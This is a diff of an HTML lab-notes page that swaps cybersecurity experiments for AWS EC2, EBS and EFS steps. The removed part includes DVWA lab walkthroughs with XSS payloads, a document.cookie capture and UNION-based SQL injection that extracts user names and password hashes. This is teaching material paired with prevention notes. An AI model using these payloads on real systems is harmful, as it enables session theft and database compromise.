-          <p class="conclusion-text">Packets were successfully captured and analyzed. Sensitive data is fully visible when HTTP is used. Packet sniffing demonstrates that unencrypted communication is unsafe — <strong>HTTPS is necessary</strong> to protect data in transit.</p>
+          <p>An EC2 instance was successfully launched on AWS. Two connection methods were demonstrated: the browser-based EC2 Connect method (no client needed) and PuTTY with a PPK key file for SSH access. Security groups control access by allowing only the required port (SSH 22).</p>
         </div>
       </div>
 
     </div>
   </div>
 
-  <!-- EXP 2 -->
-  <div class="experiment" onclick="toggle(this)">
-    <div class="exp-header">
-      <div class="exp-number" id="exp02">02</div>
-      <div class="exp-title-wrap">
-        <div class="exp-title">Analyzing Phishing Emails</div>
-        <div class="exp-subtitle">EML Analyzer · VirusTotal · SPF / DKIM / DMARC</div>
+  <!-- WEEK 2 -->
+  <div class="week" id="w2" onclick="toggle(this)">
+    <div class="week-header">
+      <div class="week-num">W02</div>
+      <div class="week-title-wrap">
+        <div class="week-title">EBS Volume &mdash; Attach, Scale, Snapshot, and Cross-Region</div>
+        <div class="week-sub">EBS &middot; lsblk &middot; fdisk &middot; mount &middot; Snapshot &middot; Cross-Region</div>
       </div>
-      <div class="exp-toggle">▾</div>
+      <div class="week-arrow">&#9662;</div>
     </div>
-    <div class="exp-body">
+    <div class="week-body">
 
       <div class="section">
-        <div class="section-label">Objective</div>
-        <p>Analyze a suspicious email using EML Analyzer and VirusTotal to identify phishing indicators based on technical header and authentication data.</p>
+        <div class="label">Objective</div>
+        <p>Scale an EC2 instance by changing its type, create and attach an EBS volume, perform cross-instance data transfer, and replicate data across AWS regions using snapshots.</p>
       </div>
 
       <div class="section">
-        <div class="section-label">Tools Used</div>
-        <div class="tools">
-          <span class="tool-pill">Online EML Analyzer</span>
-          <span class="tool-pill">VirusTotal</span>
-          <span class="tool-pill">Sample .eml file</span>
+        <div class="label">Part A &mdash; Scale Instance Type</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Create an EC2 instance with instance type <code>t2.nano</code>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text"><strong>Stop</strong> the instance (cannot change type while running).</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Select the instance &rarr; <strong>Actions &rarr; Instance Settings &rarr; Change Instance Type</strong>. Select the desired type &rarr; click <strong>Apply</strong>.</span></li>
+          <li class="step"><span class="step-n">04</span><span class="step-text">Start the instance. It now runs with the updated CPU and RAM specification.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="label">Part B &mdash; Create and Attach EBS Volume</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Go to EC2 Dashboard &rarr; <strong>Elastic Block Store &rarr; Volumes &rarr; Create Volume</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Set volume type (<code>gp3</code>/<code>gp2</code>), size, and <strong>Availability Zone</strong> (must match the target EC2 instance). Click <strong>Create Volume</strong>.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Select the new volume &rarr; <strong>Actions &rarr; Attach Volume</strong> &rarr; select the target instance &rarr; specify device name &rarr; click <strong>Attach</strong>.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="label">Part B &mdash; Use the Attached Volume (Instance A)</div>
+        <div class="code-header"><span class="code-label">PowerShell / SSH &mdash; Instance A</span><button class="copy-btn" onclick="copyBlock(this)">Copy</button></div>
+        <div class="code-block"><pre><span class="cm"># Check all available disks</span>
+<span class="cmd">lsblk</span>
+
+<span class="cm"># Check filesystem of each device</span>
+<span class="cmd">lsblk -fs</span>
+
+<span class="cm"># Create a partition on the new volume</span>
+<span class="cmd">sudo fdisk /dev/nvme1n1</span>
+<span class="cm"># Press 'm' for help menu, then follow prompts to create partition</span></pre></div>
+      </div>
+
+      <div class="section">
+        <div class="label">Part B &mdash; Mount Volume on Instance B</div>
+        <div class="code-header"><span class="code-label">PowerShell / SSH &mdash; Instance B</span><button class="copy-btn" onclick="copyBlock(this)">Copy</button></div>
+        <div class="code-block"><pre><span class="cm"># Create mount directory</span>
+<span class="cmd">sudo mkdir /mnt/ebstry</span>
+
+<span class="cm"># Mount the volume partition</span>
+<span class="cmd">sudo mount /dev/nvme1n1p1 /mnt/ebstry</span>
+
+<span class="cm"># Verify mount - all previous data will be available</span>
+<span class="cmd">lsblk</span></pre></div>
+      </div>
+
+      <div class="section">
+        <div class="label">Part C &mdash; Snapshot and Cross-Region Replication</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Detach the volume from the instance in <strong>N. Virginia</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Select the volume &rarr; <strong>Actions &rarr; Create Snapshot</strong>. Wait for the snapshot to complete.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Select the snapshot &rarr; <strong>Actions &rarr; Copy Snapshot</strong>. Choose destination region: <strong>Oregon</strong>.</span></li>
+          <li class="step"><span class="step-n">04</span><span class="step-text">Switch to Oregon region. Go to <strong>Snapshots &rarr; Actions &rarr; Create Volume from Snapshot</strong>.</span></li>
+          <li class="step"><span class="step-n">05</span><span class="step-text">Create a new EC2 instance in Oregon. Attach the volume to that instance. Connect via SSH.</span></li>
+        </ul>
+        <div class="code-header"><span class="code-label">PowerShell &mdash; Oregon Instance</span><button class="copy-btn" onclick="copyBlock(this)">Copy</button></div>
+        <div class="code-block"><pre><span class="cmd">lsblk</span>
+<span class="cmd">sudo mkdir /mnt/ebstry</span>
+<span class="cmd">sudo mount /dev/nvme1n1p1 /mnt/ebstry</span>
+<span class="cmd">df -h</span></pre></div>
+        <div class="output">
+          <div class="output-line">Data from N. Virginia is accessible in Oregon via snapshot copy</div>
         </div>
       </div>
 
       <div class="section">
-        <div class="section-label">Part A — EML Analyzer Results</div>
-        <ul class="steps">
-          <li class="step"><span class="step-num">Subject</span><span class="step-text"><strong>Warning: Final Notice</strong> — urgency-based subject line</span></li>
-          <li class="step"><span class="step-num">From</span><span class="step-text"><code>sues@nnwifi.com</code> — display name fakes malware-traffic-analysis.net</span></li>
-          <li class="step"><span class="step-num">To</span><span class="step-text"><code>brad@malware-traffic-analysis.net</code></span></li>
-          <li class="step"><span class="step-num">Sender IP</span><span class="step-text"><code>94.100.31.27</code> — Reverse DNS: 94-100-31-27.static.hvvc.us</span></li>
-          <li class="step"><span class="step-num">Auth</span><span class="step-text">SPF: <strong>Failed</strong> · DKIM: Not signed · DMARC: Not aligned · Message-ID: Missing</span></li>
-        </ul>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Part B — VirusTotal Analysis</div>
-        <ul class="steps">
-          <li class="step"><span class="step-num">IP</span><span class="step-text"><code>94.100.31.27</code> — Located in Netherlands, ASN: AS29802 (HVC-AS)</span></li>
-          <li class="step"><span class="step-num">Score</span><span class="step-text">1 / 93 vendors flagged as malicious — not widely blacklisted, but suspicious reputation</span></li>
-          <li class="step"><span class="step-num">URL</span><span class="step-text">Suspicious link extracted: <code>servervirto.com.co/ed/trn/update?email=...</code> — does not match sender domain, uses foreign TLD, harvests credentials</span></li>
-        </ul>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Answers</div>
-        <div class="qa-item"><span class="qa-q">Q1</span><span class="qa-a">Full sender email: <code>sues@nnwifi.com</code></span></div>
-        <div class="qa-item"><span class="qa-q">Q2</span><span class="qa-a">Sending domain: <code>nnwifi.com</code></span></div>
-        <div class="qa-item"><span class="qa-q">Q3</span><span class="qa-a">Sender IP: <code>94.100.31.27</code></span></div>
-        <div class="qa-item"><span class="qa-q">Q4</span><span class="qa-a">Blacklisted? Yes — 1/93 VirusTotal vendors flagged it malicious</span></div>
-        <div class="qa-item"><span class="qa-q">Q5</span><span class="qa-a">SPF result: <strong>FAIL</strong></span></div>
-        <div class="qa-item"><span class="qa-q">Q6</span><span class="qa-a">Suspicious URL: <code>https://servervirto.com.co/ed/trn/update?email=brad@malware-traffic-analysis.net</code></span></div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Final Verdict</div>
-        <div class="verdict">PHISHING CONFIRMED</div>
-      </div>
-
-    </div>
-  </div>
-
-  <!-- EXP 3 -->
-  <div class="experiment" onclick="toggle(this)">
-    <div class="exp-header">
-      <div class="exp-number" id="exp03">03</div>
-      <div class="exp-title-wrap">
-        <div class="exp-title">Password Strength Testing</div>
-        <div class="exp-subtitle">Python · Regex · Input Validation</div>
-      </div>
-      <div class="exp-toggle">▾</div>
-    </div>
-    <div class="exp-body">
-
-      <div class="section">
-        <div class="section-label">Objective</div>
-        <p>Write a Python program that evaluates a password as <em>Weak</em>, <em>Medium</em>, or <em>Strong</em> based on length, digit, case, and special-character rules.</p>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Rules</div>
-        <ul class="steps">
-          <li class="step"><span class="step-num">R1</span><span class="step-text">Minimum <strong>8 characters</strong> in length</span></li>
-          <li class="step"><span class="step-num">R2</span><span class="step-text">At least one <strong>digit</strong> (0–9)</span></li>
-          <li class="step"><span class="step-num">R3</span><span class="step-text">At least one <strong>uppercase</strong> letter</span></li>
-          <li class="step"><span class="step-num">R4</span><span class="step-text">At least one <strong>lowercase</strong> letter</span></li>
-          <li class="step"><span class="step-num">R5</span><span class="step-text">At least one <strong>special character</strong> (e.g. <code>!@#$%^&*()</code>)</span></li>
-        </ul>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Program — password_checker.py</div>
-        <div class="code-block"><pre><span class="kw">import</span> re
-
-<span class="kw">def</span> <span class="fn">check_password_strength</span>(password):
-    <span class="kw">if</span> len(password) &lt; <span class="num">8</span>:
-        <span class="kw">return</span> <span class="str">"Weak: Password must be at least 8 characters long."</span>
-    <span class="kw">if not</span> any(char.isdigit() <span class="kw">for</span> char <span class="kw">in</span> password):
-        <span class="kw">return</span> <span class="str">"Weak: Password must include at least one number."</span>
-    <span class="kw">if not</span> any(char.isupper() <span class="kw">for</span> char <span class="kw">in</span> password):
-        <span class="kw">return</span> <span class="str">"Weak: Password must include at least one uppercase letter."</span>
-    <span class="kw">if not</span> any(char.islower() <span class="kw">for</span> char <span class="kw">in</span> password):
-        <span class="kw">return</span> <span class="str">"Weak: Password must include at least one lowercase letter."</span>
-    <span class="kw">if not</span> re.search(<span class="str">r'[!@#$%^&amp;*(),.?":{}|&lt;&gt;]'</span>, password):
-        <span class="kw">return</span> <span class="str">"Medium: Add special characters to make your password stronger."</span>
-    <span class="kw">return</span> <span class="str">"Strong: Your password is secure!"</span>
-
-<span class="kw">def</span> <span class="fn">password_checker</span>():
-    print(<span class="str">"Welcome to the Password Strength Checker!"</span>)
-    <span class="kw">while</span> True:
-        password = input(<span class="str">"\nEnter your password (or type 'exit' to quit): "</span>)
-        <span class="kw">if</span> password.lower() == <span class="str">"exit"</span>:
-            print(<span class="str">"Goodbye!"</span>)
-            <span class="kw">break</span>
-        print(<span class="fn">check_password_strength</span>(password))
-
-<span class="kw">if</span> __name__ == <span class="str">"__main__"</span>:
-    <span class="fn">password_checker</span>()</pre></div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Sample Output</div>
-        <div class="output-block">
-          <div class="output-line inp">Enter your password: <strong>abc123</strong></div>
-          <div class="output-line">→ Weak: Password must be at least 8 characters long.</div>
-          <br>
-          <div class="output-line inp">Enter your password: <strong>Abcdef12</strong></div>
-          <div class="output-line">→ Medium: Add special characters to make your password stronger.</div>
-          <br>
-          <div class="output-line inp">Enter your password: <strong>Abc@1234</strong></div>
-          <div class="output-line">→ Strong: Your password is secure!</div>
-        </div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Execution Steps</div>
-        <ul class="steps">
-          <li class="step"><span class="step-num">01</span><span class="step-text">Open Command Prompt or VS Code Terminal.</span></li>
-          <li class="step"><span class="step-num">02</span><span class="step-text">Navigate to the folder: <code>cd path\to\folder</code></span></li>
-          <li class="step"><span class="step-num">03</span><span class="step-text">Run: <code>python password_checker.py</code></span></li>
-          <li class="step"><span class="step-num">04</span><span class="step-text">Enter passwords to test. Type <code>exit</code> to quit.</span></li>
-        </ul>
-      </div>
-
-    </div>
-  </div>
-
-  <!-- EXP 4 -->
-  <div class="experiment" onclick="toggle(this)">
-    <div class="exp-header">
-      <div class="exp-number" id="exp04">04</div>
-      <div class="exp-title-wrap">
-        <div class="exp-title">Basic Firewall Configuration</div>
-        <div class="exp-subtitle">Windows Defender · Python · PowerShell · netsh</div>
-      </div>
-      <div class="exp-toggle">▾</div>
-    </div>
-    <div class="exp-body">
-
-      <div class="section">
-        <div class="section-label">Objective</div>
-        <p>Configure Windows Defender Firewall to block known malicious IP addresses — both manually via the GUI and automatically using a Python script that fetches a live blocklist.</p>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Requirements</div>
-        <div class="tools">
-          <span class="tool-pill">Python 3.x</span>
-          <span class="tool-pill">Windows OS</span>
-          <span class="tool-pill">PowerShell</span>
-          <span class="tool-pill">VS Code / Any IDE</span>
-          <span class="tool-pill">Internet Connection</span>
-        </div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Part A — Manual Firewall Rule (GUI)</div>
-        <ul class="steps">
-          <li class="step"><span class="step-num">01</span><span class="step-text">Open <strong>Windows Defender Firewall with Advanced Security</strong>.</span></li>
-          <li class="step"><span class="step-num">02</span><span class="step-text">Click <strong>Inbound Rules</strong> → <strong>New Rule</strong> in the right panel.</span></li>
-          <li class="step"><span class="step-num">03</span><span class="step-text">Select <strong>Custom</strong> → All Programs → default Protocol & Ports → click Next.</span></li>
-          <li class="step"><span class="step-num">04</span><span class="step-text">Under <strong>Scope → Remote IP address</strong>, select "These IP addresses" → Add the IP (e.g. <code>1.2.3.4</code>) → OK → Next.</span></li>
-          <li class="step"><span class="step-num">05</span><span class="step-text">Action: <strong>Block the connection</strong> → Profile: Domain, Private, Public → Name: <code>Manual_Block_IP</code> → Finish.</span></li>
-        </ul>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Part B — Automated Script (firewall.py)</div>
-        <div class="code-block"><pre><span class="kw">import</span> requests, csv, subprocess
-
-<span class="cm"># Source: Abuse CH IP blocklist</span>
-response = requests.get(
-    <span class="str">"https://feodotracker.abuse.ch/downloads/ipblocklist.csv"</span>
-).text
-
-<span class="cm"># Remove any existing BadIP rules</span>
-rule = <span class="str">'netsh advfirewall firewall delete rule name="BadIP"'</span>
-subprocess.run([<span class="str">"PowerShell"</span>, <span class="str">"-Command"</span>, rule])
-
-mycsv = csv.reader(
-    filter(<span class="kw">lambda</span> x: <span class="kw">not</span> x.startswith(<span class="str">"#"</span>), response.splitlines())
-)
-
-<span class="kw">for</span> row <span class="kw">in</span> mycsv:
-    ip = row[<span class="num">1</span>]
-    <span class="kw">if</span> ip != <span class="str">"dst_ip"</span>:
-        print(<span class="str">"Added Rule to block:"</span>, ip)
-        rule = (
-            <span class="str">"netsh advfirewall firewall add rule name='BadIP' "</span>
-            <span class="str">"Dir=Out Action=Block RemoteIP="</span> + ip
-        )
-        subprocess.run([<span class="str">"PowerShell"</span>, <span class="str">"-Command"</span>, rule])</pre></div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Sample Output</div>
-        <div class="output-block">
-          <div class="output-line">Added Rule to block: 45.9.148.221</div>
-          <div class="output-line">Added Rule to block: 103.17.48.5</div>
-          <div class="output-line">Added Rule to block: 185.234.219.12</div>
-        </div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Execution Steps</div>
-        <ul class="steps">
-          <li class="step"><span class="step-num">01</span><span class="step-text">Open Command Prompt as <strong>Administrator</strong> (firewall rules require admin rights).</span></li>
-          <li class="step"><span class="step-num">02</span><span class="step-text">Navigate to the script folder: <code>cd C:\Users\YourName\Desktop</code></span></li>
-          <li class="step"><span class="step-num">03</span><span class="step-text">Verify Python: <code>python --version</code></span></li>
-          <li class="step"><span class="step-num">04</span><span class="step-text">Install dependency: <code>python -m pip install requests</code></span></li>
-          <li class="step"><span class="step-num">05</span><span class="step-text">Run the script: <code>python firewall.py</code></span></li>
-          <li class="step"><span class="step-num">06</span><span class="step-text">Verify rules: Open <strong>Windows Defender Firewall</strong> → Outbound Rules → search for <code>BadIP</code>.</span></li>
-        </ul>
-      </div>
-
-    </div>
-  </div>
-
-
-  <!-- EXP 5 — XSS -->
-  <div class="experiment" onclick="toggle(this)">
-    <div class="exp-header">
-      <div class="exp-number" id="exp05">05</div>
-      <div class="exp-title-wrap">
-        <div class="exp-title">XSS Vulnerabilities using DVWA</div>
-        <div class="exp-subtitle">Reflected · Stored · DOM-Based · Cookie Theft · Kali Linux</div>
-      </div>
-      <div class="exp-toggle">▾</div>
-    </div>
-    <div class="exp-body">
-
-      <div class="section">
-        <div class="section-label">Aim</div>
-        <p>Identify and exploit Cross-Site Scripting (XSS) vulnerabilities in DVWA — covering Reflected, Stored, and DOM-Based types to understand how JavaScript injection works in a browser context.</p>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Requirements</div>
-        <div class="tools">
-          <span class="tool-pill">Kali Linux</span>
-          <span class="tool-pill">DVWA</span>
-          <span class="tool-pill">Apache &amp; MySQL</span>
-          <span class="tool-pill">Firefox / Chromium</span>
-        </div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Step 1 — Start Services &amp; Login</div>
-        <div class="code-block"><pre><span class="cm"># Start Apache web server</span>
-sudo service apache2 start
-
-<span class="cm"># Start MySQL database</span>
-sudo service mysql start</pre></div>
-        <ul class="steps">
-          <li class="step"><span class="step-num">→</span><span class="step-text">Open Firefox → go to <code>http://localhost/dvwa</code></span></li>
-          <li class="step"><span class="step-num">→</span><span class="step-text">Login: Username: <code>admin</code> / Password: <code>password</code></span></li>
-          <li class="step"><span class="step-num">→</span><span class="step-text">Go to <strong>DVWA Security</strong> → set level to <strong>Low</strong> → Submit</span></li>
-        </ul>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Step 2 — XSS Types (Theory)</div>
-        <ul class="steps">
-          <li class="step"><span class="step-num">R</span><span class="step-text"><strong>Reflected XSS</strong> — payload injected via URL/input, reflected back once; not stored.</span></li>
-          <li class="step"><span class="step-num">S</span><span class="step-text"><strong>Stored XSS</strong> — payload saved in database, executes every time the page loads for any user.</span></li>
-          <li class="step"><span class="step-num">D</span><span class="step-text"><strong>DOM-Based XSS</strong> — payload processed by client-side JavaScript via the URL fragment.</span></li>
-        </ul>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Step 3 — Reflected XSS</div>
-        <ul class="steps">
-          <li class="step"><span class="step-num">→</span><span class="step-text">Navigate: DVWA → <strong>XSS (Reflected)</strong></span></li>
-          <li class="step"><span class="step-num">→</span><span class="step-text">In the "What's your name?" input box, type the payload below and click <strong>Submit</strong></span></li>
-        </ul>
-        <div class="code-block"><pre><span class="str">&lt;script&gt;alert('XSS')&lt;/script&gt;</span></pre></div>
-        <div class="output-block">
-          <div class="output-line">✔ Browser shows popup alert → XSS vulnerability confirmed</div>
-        </div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Step 4 — Stored XSS</div>
-        <ul class="steps">
-          <li class="step"><span class="step-num">→</span><span class="step-text">Navigate: DVWA → <strong>XSS (Stored)</strong></span></li>
-          <li class="step"><span class="step-num">→</span><span class="step-text">Fill the guestbook form with the payloads below and click <strong>Sign Guestbook</strong></span></li>
-        </ul>
-        <div class="code-block"><pre><span class="cm"># Name field:</span>
-<span class="str">&lt;h1&gt;Hacked&lt;/h1&gt;</span>
-
-<span class="cm"># Message field:</span>
-<span class="str">&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</span></pre></div>
-        <div class="output-block">
-          <div class="output-line">✔ Popup fires every page refresh → Stored XSS confirmed</div>
-          <div class="output-line inp">Page title renders as bold "Hacked" — HTML injection works too</div>
-        </div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Step 5 — DOM-Based XSS</div>
-        <ul class="steps">
-          <li class="step"><span class="step-num">→</span><span class="step-text">Navigate: DVWA → <strong>XSS (DOM)</strong></span></li>
-          <li class="step"><span class="step-num">→</span><span class="step-text">Append the payload directly to the URL in the address bar and press Enter</span></li>
-        </ul>
-        <div class="code-block"><pre><span class="cm"># Add this to the page URL in the browser address bar:</span>
-<span class="str">#&lt;script&gt;alert('DOM XSS')&lt;/script&gt;</span>
-
-<span class="cm"># Full URL looks like:</span>
-http://localhost/dvwa/vulnerabilities/xss_d/<span class="str">#&lt;script&gt;alert('DOM XSS')&lt;/script&gt;</span></pre></div>
-        <div class="output-block">
-          <div class="output-line">✔ Popup appears → DOM XSS confirmed</div>
-        </div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Step 6 — Cookie Capture (Session Theft Demo)</div>
-        <ul class="steps">
-          <li class="step"><span class="step-num">→</span><span class="step-text">In the Stored XSS Message box, enter the cookie-stealing payload below and click Sign Guestbook</span></li>
-        </ul>
-        <div class="code-block"><pre><span class="str">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>
-
-<span class="cm"># Result shows something like:</span>
-<span class="cm"># security=low; PHPSESSID=54eb55i7059b3a590853ea27a49619f6</span></pre></div>
-        <div class="output-block">
-          <div class="output-line">✔ Session cookie visible in alert box → session theft is possible over HTTP</div>
-        </div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Step 7 — Change Security Level &amp; Observe Filtering</div>
-        <ul class="steps">
-          <li class="step"><span class="step-num">→</span><span class="step-text">Go to <strong>DVWA Security</strong> → set level to <strong>Medium</strong>, then <strong>High</strong> → Submit</span></li>
-          <li class="step"><span class="step-num">→</span><span class="step-text">Repeat the same payloads and observe how input filtering blocks or escapes them at each level.</span></li>
-        </ul>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Result</div>
+        <div class="label">Conclusion</div>
         <div class="conclusion">
-          <p class="conclusion-text">All three types of XSS — Reflected, Stored, and DOM-Based — were successfully exploited on DVWA at Low security. Cookie theft via <code>document.cookie</code> confirmed session hijacking risk. Higher security levels showed progressive filtering, proving the importance of output encoding and input validation.</p>
+          <p>EBS volumes were created, attached, mounted, and verified. Scaling was achieved by changing the instance type. Cross-region data replication was demonstrated by copying a snapshot from N. Virginia to Oregon and mounting it on a new instance.</p>
         </div>
       </div>
 
     </div>
   </div>
 
-  <!-- EXP 6 — SQL Injection -->
-  <div class="experiment" onclick="toggle(this)">
-    <div class="exp-header">
-      <div class="exp-number" id="exp06">06</div>
-      <div class="exp-title-wrap">
-        <div class="exp-title">SQL Injection Attack</div>
-        <div class="exp-subtitle">Auth Bypass · UNION · DB Enumeration · Data Extraction · DVWA</div>
+  <!-- WEEK 3 -->
+  <div class="week" id="w3" onclick="toggle(this)">
+    <div class="week-header">
+      <div class="week-num">W03</div>
+      <div class="week-title-wrap">
+        <div class="week-title">Elastic File System (EFS) &mdash; Shared Storage</div>
+        <div class="week-sub">EFS &middot; NFS &middot; Amazon Linux &middot; Multi-Instance Sharing</div>
       </div>
-      <div class="exp-toggle">▾</div>
+      <div class="week-arrow">&#9662;</div>
     </div>
-    <div class="exp-body">
+    <div class="week-body">
 
       <div class="section">
-        <div class="section-label">Aim</div>
-        <p>Understand how SQL Injection vulnerabilities occur and how attackers exploit improper input validation to bypass authentication and extract complete database information from DVWA.</p>
+        <div class="label">Objective</div>
+        <p>Create an EFS file system and mount it on two EC2 instances in different Availability Zones, demonstrating shared file access across instances.</p>
       </div>
 
       <div class="section">
-        <div class="section-label">Requirements</div>
-        <div class="tools">
-          <span class="tool-pill">Kali Linux</span>
-          <span class="tool-pill">DVWA / WebGoat</span>
-          <span class="tool-pill">Apache &amp; MySQL (MariaDB)</span>
-          <span class="tool-pill">Firefox</span>
-          <span class="tool-pill">Basic SQL Knowledge</span>
-        </div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Setup — Install &amp; Start DVWA</div>
-        <div class="code-block"><pre><span class="cm"># Step 1: Install DVWA</span>
-sudo apt update
-sudo apt install dvwa -y
-
-<span class="cm"># Step 2: Start required services</span>
-sudo service apache2 start
-sudo service mysql start
-
-<span class="cm"># Step 3: Edit DVWA config (set empty DB password)</span>
-sudo nano /etc/dvwa/config.inc.php
-<span class="cm"># Ensure this line exists:</span>
-$_DVWA[<span class="str">'db_password'</span>] = <span class="str">''</span>;</pre></div>
+        <div class="label">Setup &mdash; Create Instances and Security Group</div>
         <ul class="steps">
-          <li class="step"><span class="step-num">→</span><span class="step-text">Open Firefox → <code>http://127.0.0.1/dvwa</code> → Login: <code>admin</code> / <code>password</code></span></li>
-          <li class="step"><span class="step-num">→</span><span class="step-text">Click <strong>Create / Reset Database</strong> → then go to <strong>DVWA Security</strong> → set <strong>Low</strong> → Submit</span></li>
-          <li class="step"><span class="step-num">→</span><span class="step-text">Navigate: DVWA → Vulnerabilities → <strong>SQL Injection</strong> (User ID input box appears)</span></li>
+          <li class="step"><span class="step-n">01</span><span class="step-text">Create instance <strong>efslab-1</strong>: Select Amazon Linux as AMI. Set Availability Zone to <code>us-east-1a</code>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Create a new Security Group named <code>efslab</code>. Add an inbound rule: <strong>Type: NFS</strong>, Source: <strong>Anywhere</strong>.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Create instance <strong>efslab-2</strong>: Select Amazon Linux as AMI. Set Availability Zone to <code>us-east-1b</code>. Select the existing <code>efslab</code> security group.</span></li>
         </ul>
       </div>
 
       <div class="section">
-        <div class="section-label">Step 7 — Normal Input Test</div>
-        <div class="code-block"><pre><span class="cm"># Enter in the User ID box:</span>
-<span class="num">1</span>
-<span class="cm"># Output: ID=1, First name: admin, Surname: admin</span></pre></div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Step 8 — Authentication Bypass</div>
-        <div class="code-block"><pre><span class="cm"># Classic OR-based bypass — enter in User ID box:</span>
-<span class="str">1' OR '1'='1</span>
-
-<span class="cm"># Result: ALL user records dumped</span>
-<span class="cm"># Confirms SQL Injection vulnerability</span></pre></div>
-        <div class="output-block">
-          <div class="output-line">ID: 1' or '1'='1 → First name: admin, Surname: admin</div>
-          <div class="output-line">ID: 1' or '1'='1 → First name: Gordon, Surname: Brown</div>
-          <div class="output-line">ID: 1' or '1'='1 → First name: Hack, Surname: Me</div>
-          <div class="output-line">... (all records shown)</div>
-        </div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Step 9 — Find Number of Columns (ORDER BY)</div>
-        <div class="code-block"><pre><span class="cm"># Try incrementing until error occurs:</span>
-<span class="str">1' ORDER BY 1-- -</span>   <span class="cm"># works</span>
-<span class="str">1' ORDER BY 2-- -</span>   <span class="cm"># works</span>
-<span class="str">1' ORDER BY 3-- -</span>   <span class="cm"># ERROR → 2 columns confirmed</span>
-
-<span class="cm"># Last successful number = total column count</span></pre></div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Step 10 — UNION-Based Injection</div>
-        <div class="code-block"><pre><span class="cm"># Identify which columns are visible in output:</span>
-<span class="str">1' UNION SELECT 1,2-- -</span>
-
-<span class="cm"># Output shows "1" and "2" in First name / Surname fields</span>
-<span class="cm"># Both columns are injectable</span></pre></div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Step 11 — Extract Database Name</div>
-        <div class="code-block"><pre><span class="str">1' UNION SELECT database(),2-- -</span>
-
-<span class="cm"># Output First name: dvwa ← current database name</span></pre></div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Step 12 — Extract Table Names</div>
-        <div class="code-block"><pre><span class="str">1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -</span>
-
-<span class="cm"># Output tables: admin, guestbook, users</span></pre></div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Step 13 — Extract Column Names</div>
-        <div class="code-block"><pre><span class="str">1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -</span>
-
-<span class="cm"># Columns found: user_id, first_name, last_name, user, password, ...</span></pre></div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Step 14 — Extract Usernames &amp; Password Hashes</div>
-        <div class="code-block"><pre><span class="str">1' UNION SELECT user,password FROM users-- -</span></pre></div>
-        <div class="output-block">
-          <div class="output-line">First name: admin → Surname: 5f4dcc3b5aa765d61d8327deb882cf99</div>
-          <div class="output-line">First name: gordonb → Surname: e99a18c428cb38d5f260853678922e03</div>
-          <div class="output-line">First name: 1337 → Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</div>
-          <div class="output-line inp">Passwords are MD5 hashes — crack with hashcat or online tools</div>
-        </div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Prevention Techniques (Viva)</div>
+        <div class="label">Create EFS File System</div>
         <ul class="steps">
-          <li class="step"><span class="step-num">✓</span><span class="step-text"><strong>Prepared Statements</strong> (Parameterized Queries) — most effective defense</span></li>
-          <li class="step"><span class="step-num">✓</span><span class="step-text"><strong>Input Validation &amp; Sanitization</strong> — reject or escape special characters</span></li>
-          <li class="step"><span class="step-num">✓</span><span class="step-text"><strong>Stored Procedures</strong> — limit dynamic SQL usage</span></li>
-          <li class="step"><span class="step-num">✓</span><span class="step-text"><strong>Web Application Firewalls (WAF)</strong> — detect &amp; block injection patterns</span></li>
-          <li class="step"><span class="step-num">✓</span><span class="step-text"><strong>Least Privilege DB Access</strong> — DB user should only have SELECT, not DROP/ALTER</span></li>
+          <li class="step"><span class="step-n">04</span><span class="step-text">Search for <strong>EFS</strong> in the AWS Console &rarr; click <strong>Create File System</strong>. Provide a name &rarr; click <strong>Create</strong>.</span></li>
+          <li class="step"><span class="step-n">05</span><span class="step-text">Select the file system &rarr; <strong>View Details &rarr; Network</strong> tab &rarr; click <strong>Manage</strong>. Update the security group to <code>efslab</code>.</span></li>
